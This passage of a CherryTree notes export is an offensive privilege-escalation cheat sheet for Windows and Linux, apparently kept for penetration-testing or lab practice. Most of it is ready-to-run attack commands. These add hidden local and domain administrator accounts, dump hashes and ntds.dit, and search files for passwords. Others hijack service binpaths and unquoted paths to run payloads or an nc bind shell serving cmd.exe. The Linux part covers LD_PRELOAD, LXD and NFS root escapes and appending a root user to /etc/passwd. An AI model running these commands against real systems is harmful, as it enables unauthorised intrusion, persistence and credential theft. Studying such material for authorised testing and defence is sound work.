[Installing Elevated]
msiexec /i &lt;path to msi file&gt;

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">+ Some Domains.xml Abuse.</rich_text>
        <rich_text background="#000000000000">
</rich_text>
        <rich_text link="webs https://github.com/FSecureLABS/SharpGPOAbuse" background="#000000000000">https://github.com/FSecureLABS/SharpGPOAbuse</rich_text>
        <rich_text background="#000000000000">


</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">+ Will the path to privilege escalation lie in a executable binary or service in Program Files? Is it listening on local only and thus we missed it from the outside scans?</rich_text>
        <rich_text background="#000000000000">
cd "C:\Program Files"
DIR /A /O /Q

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">cd "C:\Program Files (x86)"</rich_text>
        <rich_text background="#000000000000">
DIR /A /O /Q

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">+ What is my current user's privileges?</rich_text>
        <rich_text background="#000000000000">
net user someWindowsUser

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">+ What are other user's privileges?</rich_text>
        <rich_text background="#000000000000">
net users

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">+ Hash Collection:</rich_text>
        <rich_text background="#000000000000">
pg_dump.exe
meterpreter &gt; hashdump

ntds.dit exfiltration.

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">+ Who's the Administrator(s) around here?</rich_text>
        <rich_text background="#000000000000">
net localgroup administrators

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">+ Might we be able to move laterally to them if they are Administrators?</rich_text>
        <rich_text background="#000000000000">
net user somePotentialAdminUser

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">+ Firewall Information?</rich_text>
        <rich_text background="#000000000000">
netsh firewall show state
netsh firewall show config

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">+ Network Information (who am I connected to? can anything off of Loopback be forwarded out to 0.0.0.0?)</rich_text>
        <rich_text background="#000000000000">
netstat -anoy
route print
arp -A
ipconfig /all

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">+ Cleartext Passwords in Files? Search for them.</rich_text>
        <rich_text background="#000000000000">
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">+ Find all those password and credential strings in config files.</rich_text>
        <rich_text background="#000000000000">
dir /s pass == cred == vnc == .config

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">+ Find all passwords in all files...</rich_text>
        <rich_text background="#000000000000">
findstr /spin "password" .

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">+ WINDOWS SHARES.</rich_text>
        <rich_text background="#000000000000">
NET SHARE
NET USE

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">--&gt; CREATE A SHARE ON WINDOWS FROM THE COMMAND LINE:</rich_text>
        <rich_text background="#000000000000">
NET SHARE &lt;sharename&gt;=&lt;drive/folderpath&gt; /remark: "This is my share."
</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">--&gt; MOUNT A WINDOWS SHARE FROM THE COMMAND LINE:</rich_text>
        <rich_text background="#000000000000">
NET USE Z: \\COMPUTER_NAME\SHARE_NAME /PERSISTENT:YES
--&gt; UNMOUNT SHARE:
NET USE Z: /DELETE
--&gt; DELETE A SHARE ENTIRLEY:
NET SHARE /DELETE

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">+ Find ALL weak file permissions per drive.</rich_text>
        <rich_text background="#000000000000">
accesschk.exe -uwqs Users c:*.*

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">+ A part of group "Authenticated Users" - you would be surprised if you have a real user.</rich_text>
        <rich_text background="#000000000000">
accesschk.exe -uwqs "Authenticated Users" c:*.*


</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">+ Add an Administrator User with all of the goodies.</rich_text>
        <rich_text background="#000000000000">
cmd.exe /c net user siren superPassword /add
cmd.exe /c net localgroup administrators siren /add
cmd.exe /c net localgroup "Remote Desktop Users" siren /add

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">+ Adding a Windows Domain Administrator from the Command Line:</rich_text>
        <rich_text background="#000000000000">
cmd.exe /c net user siren superPassword /add
net localgroup Administrators siren /ADD /DOMAIN
net localgroup "Remote Desktop Users" siren /ADD /DOMAIN
net group "Domain Admins" siren /ADD /DOMAIN
net group "Enterprise Admins" siren /ADD /DOMAIN
net group "Schema Admins" siren /ADD /DOMAIN
net group "Group Policy Creator Owners" siren /ADD /DOMAIN

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">+ Time and our own Scheduled Tasks.</rich_text>
        <rich_text background="#000000000000">
time
The current time is: 6:41:05.81
at 06:42 /interactive "C:\Tools\sirenMaint.exe"

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">+ Create a Task. Run as System. Every 5 minutes. Path to binary.</rich_text>
        <rich_text background="#000000000000">
schtasks /create /ru SYSTEM /sc MINUTE /MO 5 /tn RUNME /tr "\"C:\Tools\sirenMaint.exe\""
Attacking Machine:
nc -lvp 443
Victim Machine:
schtasks /RUN /TN "RUNME"

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">+ Fun with Accesschk Enumeration!</rich_text>
        <rich_text background="#000000000000">
accesschk.exe /accepteula (always do this first!!!!!)
accesschk.exe -ucqv [service_name] (requires sysinternals accesschk!)
accesschk.exe -uwcqv "Authenticated Users" * (won't yield anything on Win 8)
accesschk.exe -ucqv [service_name]

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">#Find ALL weak folder permissions, per drive.</rich_text>
        <rich_text background="#000000000000">
accesschk.exe -uwdqs Users c:\
accesschk.exe -uwdqs "Authenticated Users" c:\
accesschk.exe -uwqs Users c:*.*
accesschk.exe -uwqs "Authenticated Users" c:*.*


</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">+ Let me guess, you came in as NT AUTHORITY\NETWORK SERVICE ?</rich_text>
        <rich_text background="#000000000000">
MS09-012.exe "whoami"
Initiate Network-Related Transfer Again.
MS09-012.exe "ftp -v -n -s:ftp.txt" and come back in NT Shell.


</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">+ I enumerated a weak service path on the machine. How do I exploit this... S1REN?</rich_text>
        <rich_text background="#000000000000">
sc config UPNPHOST binpath= "C:\Tools\sirenMaint.exe"
sc config UPNPHOST obj= ".\LocalSystem" password= ""
sc config SSDPSRV binpath= "C:\inetpub\siren\sirenMaint.exe"
sc config SSDPSRV obj= ".\LocalSystem" password= ""
sc config SSDPSRV start= "demand"
(Now, Stage matching msfvenom Payload Listener in Meterpreter)
net stop SSDPSRV
net start SSDPSRV

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">+ Up to Vista...</rich_text>
        <rich_text background="#000000000000">
psexec -i -s cmd.exe

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">+ On Windows XP and Older we can get an Administrator Privilege shell.</rich_text>
        <rich_text background="#000000000000">

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">--&gt; IF you have a GUI with a USER THAT IS INCLUDED IN THE Administrators GROUP you first</rich_text>
        <rich_text background="#000000000000">
</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">need to open up cmd.exe for the administrator. If you open up the cmd that is in
Accessories it will be opened up as a normal user. And if you rightclick and do
Run as Administrator you might need to know the Administrators password. Which
you might not know. So instead you open up the cmd from C:\windows\system32\cmd.exe.
This will give you a cmd with Administrators Rights.

--&gt; From here, we want SYSTEM level privileges, no?
--&gt; First we check what time it is on the local machine.
time
--&gt; Now we set the time we want the system CMD to start.
--&gt; Probably one minuter after the time.
at 01:23 /interactive cmd.exe
System Shell.</rich_text>
        <rich_text background="#000000000000">




</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">+ Ahh, so you're interested in UNQUOTED SERVICE PATHS... eh?</rich_text>
        <rich_text background="#000000000000">
wmic service get name,displayname,pathname,startmode |findstr /i "auto" |findstr /i /v "c:\windows\" |findstr /i /v """

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">--&gt; Using SC:</rich_text>
        <rich_text background="#000000000000">
sc query
sc qc &lt;service name&gt;

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">--&gt; Okay S1REN, what am I looking for here?</rich_text>
        <rich_text background="#000000000000">
If the results of the above command's value of path only contains "" and spaces - it's vulnerable.

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">--&gt; Have a hit?
--&gt; Use icacls or cacls.exe (both native to Windows) to check binary permissions.</rich_text>
        <rich_text background="#000000000000">
icacls "C:\Program Files (x86)\UNQUOTED_SERVICE_PATH_SOFTWARE"
</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">
--&gt; Exploit it.
--&gt; If the path of the Binary file is:</rich_text>
        <rich_text background="#000000000000">
C:\Program Files\something\something.exe
</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">--&gt; Then,</rich_text>
        <rich_text background="#000000000000">
move something.exe something.exe.BACK
move sirenMaint.exe C:\Program Files\something\
move sirenMaint.exe something.exe

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">--&gt; Well, wasn't that fun? Now our payload will get executed instead of the intended exe!
--&gt; Nice.</rich_text>
        <rich_text background="#000000000000">

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">#S1REN, is there a better way to enumerate out every service and then just check for which of them has an Unquoted Bin Paths?
--&gt; Yup.
--&gt; Thanks S1REN!</rich_text>
        <rich_text background="#000000000000">
cd "C:\Windows\TEMP"
sc query state= all | findstr "SERVICE_NAME:" &gt;&gt; ServiceNames.txt
FOR /F %i in (ServiceNames.txt) DO echo %i
type ServiceNames.txt
FOR /F "tokens=2 delims= " %i in (ServiceNames.txt) DO @echo %i &gt;&gt; Services.txt
FOR /F %i in (Services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" &gt;&gt; path.txt
type path.txt

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">Nice.</rich_text>
        <rich_text background="#000000000000">

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">#Continued
--&gt; S1REN.
--&gt; Yes?
--&gt; Is there a way to do essentially the same thing and then recursively execute icacls.exe or cacls.exe on them to get the information I need?
--&gt; Yup.</rich_text>
        <rich_text background="#000000000000">

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">cd "C:\Windows\TEMP\"</rich_text>
        <rich_text background="#000000000000">
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a &gt;&gt; C:\windows\temp\permissions.txt

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">icacls.exe:</rich_text>
        <rich_text background="#000000000000">
for /f eol^=^"^ delims^=^" %a in (C:\windows\temp\permissions.txt) do cmd.exe /c icacls "%a"

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">cacls.exe</rich_text>
        <rich_text background="#000000000000">
for /f eol^=^"^ delims^=^" %a in (c:\windows\temp\permissions.txt) do cmd.exe /c cacls "%a"
</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">
IF YOU FIND A SERVICE THAT HAS WRITE PERMISSIONS set to "EVERYONE", you can change
that binary INTO YOUR OWN CUSTOM BINARY and make it execute in the privileged context.
</rich_text>
        <rich_text background="#000000000000">
</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">+ Dealing with Scheduled Tasks with SYSTEM Privileges.
--&gt; Here we are looking for tasks that are run by a privileged user, and run a binary
that we can overwrite.</rich_text>
        <rich_text background="#000000000000">
schtasks /query /fo LIST /v &gt; schtask.txt
type schtask.txt
</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">(Copy that output to a temporary file</rich_text>
        <rich_text background="#000000000000">
</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">
--&gt; Yeah I know this ain't pretty, but it works. You can of course change the name
SYSTEM to another privileged user. In other words, copy the output into Kali and
just grep for SYSTEM.
--&gt; Nice, S1REN.
--&gt; Thanks.</rich_text>
        <rich_text background="#000000000000">
cat schtask.txt | grep "SYSTEM|Task To Run" | grep -B 1 SYSTEM --color=auto

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">--&gt; Now, Change up the UPNP Service Binary Path (for example):</rich_text>
        <rich_text background="#000000000000">
sc config upnphost binpath= "C:\Tools\nc.exe -nlvp 6666 -e C:\Windows\system32\cmd.exe"
sc config upnphost obj= ".\LocalSystem" password= ""
sc config upnphost depend= ""
net stop &lt;service&gt;
</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">--&gt; Attacking Machine</rich_text>
        <rich_text background="#000000000000">
nc -nlvp 6666
net start &lt;service&gt;
</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">
Tools:</rich_text>
        <rich_text background="#000000000000">
(Remember how I said to save a local copy of that systeminfo output?)
</rich_text>
        <rich_text link="webs https://github.com/AonCyberLabs/Windows-Exploit-Suggester" background="#000000000000">https://github.com/AonCyberLabs/Windows-Exploit-Suggester</rich_text>
        <rich_text background="#000000000000">
</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">
+ How do I cross-compile payloads for Windows on Linux, S1REN?</rich_text>
        <rich_text background="#000000000000">
</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">--&gt; Dude, check this out.</rich_text>
        <rich_text background="#000000000000">
apt-get install mingw-w64

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">+ Cross-Compilation Reference:</rich_text>
        <rich_text background="#000000000000">
# Ci686-w64-mingw32-gcc hello.c -o hello32.exe     
# 32-bitx86_64-w64-mingw32-gcc hello.c -o hello64.exe    
# 64-bit # C++i686-w64-mingw32-g++ hello.cc -o hello32.exe    
# 32-bitx86_64-w64-mingw32-g++ hello.cc -o hello64.exe   # 64-bit


</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">+ Migrate to a stable process.</rich_text>
        <rich_text background="#000000000000">
</rich_text>
        <rich_text link="webs https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/" background="#000000000000">https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/</rich_text>
        <rich_text background="#000000000000">
--&gt; "Using the migrate post module, you can migrate to another process on the victim."
meterpreter&gt; run post/windows/manage/migrate
meterpreter&gt; migrate -h
meterpreter&gt; migrate &lt;PID&gt;

</rich_text>
      </node>
    </node>
    <node unique_id="40" master_id="0" name="Linux" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="1" foreground="" ts_creation="1670957068" ts_lastsave="1670957516">
      <node unique_id="45" master_id="0" name="Linux" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670957409" ts_lastsave="1670958729">
        <rich_text background="#000000000000">

 </rich_text>
        <rich_text family="monospace" background="#000000000000">ps aux | grep root</rich_text>
        <rich_text background="#000000000000">

See processes running as root

</rich_text>
        <rich_text family="monospace" background="#000000000000">ps au</rich_text>
        <rich_text background="#000000000000">

See logged in users

</rich_text>
        <rich_text family="monospace" background="#000000000000">ls /home</rich_text>
        <rich_text background="#000000000000">

View user home directories

</rich_text>
        <rich_text family="monospace" background="#000000000000">ls -l ~/.ssh</rich_text>
        <rich_text background="#000000000000">

Check for SSH keys for current user

</rich_text>
        <rich_text family="monospace" background="#000000000000">history</rich_text>
        <rich_text background="#000000000000">

Check the current user's Bash history

</rich_text>
        <rich_text family="monospace" background="#000000000000">sudo -l</rich_text>
        <rich_text background="#000000000000">

Can the user run anything as another user?

</rich_text>
        <rich_text family="monospace" background="#000000000000">ls -la /etc/cron.daily</rich_text>
        <rich_text background="#000000000000">

Check for daily Cron jobs

</rich_text>
        <rich_text family="monospace" background="#000000000000">lsblk</rich_text>
        <rich_text background="#000000000000">

Check for unmounted file systems/drives

</rich_text>
        <rich_text family="monospace" background="#000000000000">find / -path /proc -prune -o -type d -perm -o+w 2&gt;/dev/null</rich_text>
        <rich_text background="#000000000000">

Find world
</rich_text>
        <rich_text family="monospace" background="#000000000000">find / -path /proc -prune -o -type f -perm -o+w 2&gt;/dev/null</rich_text>
        <rich_text background="#000000000000">

Find world-writeable files

</rich_text>
        <rich_text family="monospace" background="#000000000000">uname -a</rich_text>
        <rich_text background="#000000000000">

Check the Kernel versiion

</rich_text>
        <rich_text family="monospace" background="#000000000000">cat /etc/lsb-release</rich_text>
        <rich_text background="#000000000000">

Check the OS version

</rich_text>
        <rich_text family="monospace" background="#000000000000">gcc kernel_expoit.c -o kernel_expoit</rich_text>
        <rich_text background="#000000000000">

Compile an exploit written in C

</rich_text>
        <rich_text family="monospace" background="#000000000000">screen -v</rich_text>
        <rich_text background="#000000000000">

Check the installed version of </rich_text>
        <rich_text family="monospace" background="#000000000000">Screen</rich_text>
        <rich_text background="#000000000000">

</rich_text>
        <rich_text family="monospace" background="#000000000000">./pspy64 -pf -i 1000</rich_text>
        <rich_text background="#000000000000">

View running processes with </rich_text>
        <rich_text family="monospace" background="#000000000000">pspy</rich_text>
        <rich_text background="#000000000000">

</rich_text>
        <rich_text family="monospace" background="#000000000000">find / -user root -perm -4000 -exec ls -ldb {} ; 2&gt;/dev/null</rich_text>
        <rich_text background="#000000000000">

Find binaries with the SUID bit set

</rich_text>
        <rich_text family="monospace" background="#000000000000">find / -user root -perm -6000 -exec ls -ldb {} ; 2&gt;/dev/null</rich_text>
        <rich_text background="#000000000000">

Find binaries with the SETGID bit set

</rich_text>
        <rich_text family="monospace" background="#000000000000">sudo /usr/sbin/tcpdump -ln -i ens192 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root</rich_text>
        <rich_text background="#000000000000">

Priv esc with </rich_text>
        <rich_text family="monospace" background="#000000000000">tcpdump</rich_text>
        <rich_text background="#000000000000">

</rich_text>
        <rich_text family="monospace" background="#000000000000">echo $PATH</rich_text>
        <rich_text background="#000000000000">

Check the current user's PATH variable contents

</rich_text>
        <rich_text family="monospace" background="#000000000000">PATH=.:${PATH}</rich_text>
        <rich_text background="#000000000000">

Add a </rich_text>
        <rich_text family="monospace" background="#000000000000">.</rich_text>
        <rich_text background="#000000000000"> to the beginning of the current user's PATH

</rich_text>
        <rich_text family="monospace" background="#000000000000">find / ! -path "*/proc/*" -iname "*config*" -type f 2&gt;/dev/null</rich_text>
        <rich_text background="#000000000000">

Search for config files

</rich_text>
        <rich_text family="monospace" background="#000000000000">ldd /bin/ls</rich_text>
        <rich_text background="#000000000000">

View the shared objects required by a binary

</rich_text>
        <rich_text family="monospace" background="#000000000000">sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart</rich_text>
        <rich_text background="#000000000000">

Escalate privileges using </rich_text>
        <rich_text family="monospace" background="#000000000000">LD_PRELOAD</rich_text>
        <rich_text background="#000000000000">

</rich_text>
        <rich_text family="monospace" background="#000000000000">readelf -d payroll | grep PATH</rich_text>
        <rich_text background="#000000000000">

Check the RUNPATH of a binary

</rich_text>
        <rich_text family="monospace" background="#000000000000">gcc src.c -fPIC -shared -o /development/libshared.so</rich_text>
        <rich_text background="#000000000000">

Compiled a shared libary

</rich_text>
        <rich_text family="monospace" background="#000000000000">lxd init</rich_text>
        <rich_text background="#000000000000">

Start the LXD initialization process

</rich_text>
        <rich_text family="monospace" background="#000000000000">lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine</rich_text>
        <rich_text background="#000000000000">

Import a local image

</rich_text>
        <rich_text family="monospace" background="#000000000000">lxc init alpine r00t -c security.privileged=true</rich_text>
        <rich_text background="#000000000000">

Start a privileged LXD container

</rich_text>
        <rich_text family="monospace" background="#000000000000">lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true</rich_text>
        <rich_text background="#000000000000">

Mount the host file system in a container

</rich_text>
        <rich_text family="monospace" background="#000000000000">lxc start r00t</rich_text>
        <rich_text background="#000000000000">

Start the container

</rich_text>
        <rich_text family="monospace" background="#000000000000">showmount -e 10.129.2.12</rich_text>
        <rich_text background="#000000000000">

Show the NFS export list

</rich_text>
        <rich_text family="monospace" background="#000000000000">sudo mount -t nfs 10.129.2.12:/tmp /mnt</rich_text>
        <rich_text background="#000000000000">

Mount an NFS share locally

</rich_text>
        <rich_text family="monospace" background="#000000000000">tmux -S /shareds new -s debugsess</rich_text>
        <rich_text background="#000000000000">

Created a shared </rich_text>
        <rich_text family="monospace" background="#000000000000">tmux</rich_text>
        <rich_text background="#000000000000"> session socket

</rich_text>
        <rich_text family="monospace" background="#000000000000">./lynis audit system</rich_text>
        <rich_text background="#000000000000">

Perform a system audit with </rich_text>
        <rich_text family="monospace" background="#000000000000">Lynis</rich_text>
      </node>
      <node unique_id="46" master_id="0" name="offsec (s1ren)" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1670957516" ts_lastsave="1670984883">
        <rich_text background="#000000000000" foreground="#ffff00000000">g0tmilk's Guide to Linux Privilege Escalation as well:</rich_text>
        <rich_text background="#000000000000">
https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">I just got a low-priv shell !
What would S1REN do right now?</rich_text>
        <rich_text background="#000000000000">


python -c 'import pty; pty.spawn("/bin/bash")'
OR
python3 -c 'import pty; pty.spawn("/bin/bash")'
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp
export TERM=xterm-256color
alias ll='ls -lsaht --color=auto'
Ctrl + Z [Background Process]
stty raw -echo ; fg ; reset
stty columns 200 rows 200

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">
S1REN would say:
Various Capabilities?</rich_text>
        <rich_text background="#000000000000">


which gcc
which cc
which python
which perl
which wget
which curl
which fetch
which nc
which ncat
which nc.traditional
which socat

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">Compilation? (Very Back Burner)</rich_text>
        <rich_text background="#000000000000">

file /bin/bash


</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">What Arch?</rich_text>
        <rich_text background="#000000000000">

file /bin/bash


</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">Kernel?</rich_text>
        <rich_text background="#000000000000">

uname -a


</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">Issue/Release?</rich_text>
        <rich_text background="#000000000000">

cat /etc/issue
cat /etc/*-release


</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">Are we a real user?</rich_text>
        <rich_text background="#000000000000">

sudo -l
ls -lsaht /etc/sudoers


</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">Are any users a member of exotic groups?</rich_text>
        <rich_text background="#000000000000">

groups &lt;user&gt;


</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">Check out your shell's environment variables...</rich_text>
        <rich_text background="#000000000000">

env
https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/



</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">Users?</rich_text>
        <rich_text background="#000000000000">


cd /home/
ls -lsaht

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">Web Configs containing credentials?</rich_text>
        <rich_text background="#000000000000">


cd /var/www/html/
ls -lsaht


</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">SUID Binaries?</rich_text>
        <rich_text background="#000000000000">

find / -perm -u=s -type f 2&gt;/dev/null


</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">GUID Binaries?</rich_text>
        <rich_text background="#000000000000">

find / -perm -g=s -type f 2&gt;/dev/null



</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">SUID/GUID/SUDO Escalation:</rich_text>
        <rich_text background="#000000000000">

https://gtfobins.github.io/

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">Binary/Languages with "Effective Permitted" or "Empty Capability" (ep):</rich_text>
        <rich_text background="#000000000000">
</rich_text>
        <rich_text link="webs https://www.insecure.ws/linux/getcap_setcap.html#getcap-setcap-and-file-capabilities" background="#000000000000">https://www.insecure.ws/linux/getcap_setcap.html#getcap-setcap-and-file-capabilities</rich_text>
        <rich_text background="#000000000000">


</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">Get Granted/Implicit (Required by a Real User) Capabilities of all files recursively throughout the system and pipe all error messages to /dev/null.</rich_text>
        <rich_text background="#000000000000">

getcap -r / 2&gt;/dev/null


</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">We need to start monitoring the system if possible while performing our enumeration...
In other words:
"S1REN... Is privilege escalation going to come from some I/O file operations being done by some script on the system?"</rich_text>
        <rich_text background="#000000000000">

</rich_text>
        <rich_text link="webs https://github.com/DominicBreuker/pspy/blob/master/README.md" background="#000000000000">https://github.com/DominicBreuker/pspy/blob/master/README.md</rich_text>
        <rich_text background="#000000000000">

cd /var/tmp/
File Transfer --&gt; pspy32
File Transfer --&gt; pspy64
chmod 755 pspy32 pspy64
./pspy&lt;32/64&gt;



</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">What does the local network look like?</rich_text>
        <rich_text background="#000000000000">

netstat -antup
netstat -tunlp


</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">Is anything vulnerable running as root?</rich_text>
        <rich_text background="#000000000000">

ps aux |grep -i 'root' --color=auto



</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">MYSQL Credentials? Root Unauthorized Access?</rich_text>
        <rich_text background="#000000000000">

mysql -uroot -p
Enter Password:
root : root
root : toor
root :


</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">S1REN would take a quick look at etc to see if any user-level people did special things:</rich_text>
        <rich_text background="#000000000000">

cd /etc/
ls -lsaht


</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">Anything other than root here?</rich_text>
        <rich_text background="#000000000000">
</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">• Any config files left behind?</rich_text>
        <rich_text background="#000000000000">

→ ls -lsaht |grep -i ‘.conf’ --color=auto


</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">• If we have root priv information disclosure - are there any .secret in /etc/ files?</rich_text>
        <rich_text background="#000000000000">

→ ls -lsaht |grep -i ‘.secret’ --color=aut



</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">SSH Keys I can use perhaps for even further compromise?</rich_text>
        <rich_text background="#000000000000">

ls -lsaR /home/



</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">Quick look in:</rich_text>
        <rich_text background="#000000000000">

ls -lsaht /var/lib/
ls -lsaht /var/db/


</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">Quick look in:</rich_text>
        <rich_text background="#000000000000">

ls -lsaht /opt/
ls -lsaht /tmp/
ls -lsaht /var/tmp/
ls -lsaht /dev/shm/


</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">File Transfer Capability? What can I use to transfer files?</rich_text>
        <rich_text background="#000000000000">

which wget
which curl
which nc
which fetch (BSD)
ls -lsaht /bin/ |grep -i 'ftp' --color=auto



</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">NFS? Can we exploit weak NFS Permissions?</rich_text>
        <rich_text background="#000000000000">

cat /etc/exports
no_root_squash?
https://recipeforroot.com/attacking-nfs-shares/

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">[On Attacking Machine]</rich_text>
        <rich_text background="#000000000000">

mkdir -p /mnt/nfs/
mount -t nfs -o vers=&lt;version 1,2,3&gt; $IP:&lt;NFS Share&gt; /mnt/nfs/ -nolock
gcc suid.c -o suid
cp suid /mnt/nfs/
chmod u+s /mnt/nfs/suid
su &lt;user id matching target machine's user-level privilege.&gt;

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">[On Target Machine]</rich_text>
        <rich_text background="#000000000000">
user@host$ ./suid
#



</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">Where can I live on this machine? Where can I read, write and execute files?</rich_text>
        <rich_text background="#000000000000">

/var/tmp/
/tmp/
/dev/shm/


</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">Any exotic file system mounts/extended attributes?</rich_text>
        <rich_text background="#000000000000">

cat /etc/fstab

</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">Forwarding out a weak service for root priv (with meterpreter!):
Do we need to get a meterpreter shell and forward out some ports that might be running off of the Loopback Adaptor (127.0.0.1) and forward them to any (0.0.0.0)? If I see something like Samba SMBD out of date on 127.0.0.1 - we should look to forward out the port and then run trans2open on our own machine at the forwarded port.</rich_text>
        <rich_text background="#000000000000">

https://www.offensive-security.com/metasploit-unleashed/portfwd/

Forwarding out netbios-ssn EXAMPLE:
meterpreter&gt; portfwd add –l 139 –p 139 –r [target remote host]
meterpreter&gt; background
use exploit/linux/samba/trans2open
set RHOSTS 0.0.0.0
set RPORT 139
run



</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">Can we write as a low-privileged user to /etc/passwd?</rich_text>
        <rich_text background="#000000000000">

openssl passwd -1
i&lt;3hacking
$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.
echo 'siren:$1$/UTMXpPC$Wrv6PM4eRHhB1/m1P.t9l.:0:0:siren:/home/siren:/bin/bash' &gt;&gt; /etc/passwd
su siren
id


</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">Cron.?</rich_text>
        <rich_text background="#000000000000">

crontab –u root –l


</rich_text>
        <rich_text background="#000000000000" foreground="#ffff00000000">Look for unusual system-wide cron jobs:</rich_text>
